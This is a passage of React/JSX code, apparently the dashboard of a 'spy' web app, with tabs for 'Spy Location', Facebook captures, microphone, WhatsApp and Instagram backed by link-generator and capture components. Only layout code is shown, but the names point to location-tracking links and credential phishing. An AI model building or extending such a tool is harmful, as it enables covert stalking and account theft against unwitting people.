                    onMouseOver={e => e.currentTarget.style.boxShadow = '0 8px 32px 0 #E6003340'}
                    onMouseOut={e => e.currentTarget.style.boxShadow = '0 4px 24px 0 #0007'}
                    onFocus={e => e.currentTarget.style.boxShadow = '0 8px 32px 0 #E6003340'}
                    onBlur={e => e.currentTarget.style.boxShadow = '0 4px 24px 0 #0007'}
                  >
                    {tool.icon}
                    <span style={{ fontSize: 1.18 + 'rem', fontWeight: 700, letterSpacing: 0.5 }}>{tool.label}</span>
                    <span style={{ color: '#b0b0b0', fontSize: '1rem', fontWeight: 400, marginTop: 8 }}>{tool.desc}</span>
                  </div>
                ))}
              </div>
            </>
          )}
          {active === 'Lessons' && (
            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
                <FaBook size={36} color="#E60033" />
                <h2 style={{ color: '#E60033', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Lessons</h2>
              </div>
              <LinkGenerator />
            </div>
          )}
          {active === 'Spy Location' && (
            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
                <FaMapMarkerAlt size={36} color="#25d366" />
                <h2 style={{ color: '#25d366', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Spy Location</h2>
              </div>
              <div>
                <LinkGenerator />
                <LinksList />
              </div>
            </div>
          )}
          {active === 'Facebook' && (
            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
                <FaFacebookF size={36} color="#1877f3" />
                <h2 style={{ color: '#1877f3', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Facebook</h2>
              </div>
              <div>
                <LinkGenerator onlyFacebook />
                <FacebookCaptures />
              </div>
            </div>
          )}
          {active === 'Microphone' && (
            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
                <FaMicrophone size={36} color="#fff" />
                <h2 style={{ color: '#fff', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Microphone</h2>
              </div>
              <MicrophonePlaceholder />
            </div>
          )}
          {active === 'WhatsApp' && (
            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
                <FaWhatsapp size={36} color="#25d366" />
                <h2 style={{ color: '#25d366', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>WhatsApp</h2>
              </div>
              <WhatsAppSim
                onBack={() => setActive(null)}
                showLoadMoreMsg={showLoadMoreMsg}
                setShowLoadMoreMsg={setShowLoadMoreMsg}
              />
            </div>
          )}
          {active === 'Instagram' && (
            <div style={{ color: '#fff', fontSize: 22, marginTop: 40, textAlign: 'center', width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
              <FaInstagram size={36} color="#E1306C" />
              <h2 style={{ color: '#E1306C', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Instagram</h2>
              <b style={{ marginTop: 16 }}>Instagram coming soon...</b>
            </div>
          )}
        </div>
      </div>
    </>
  );
}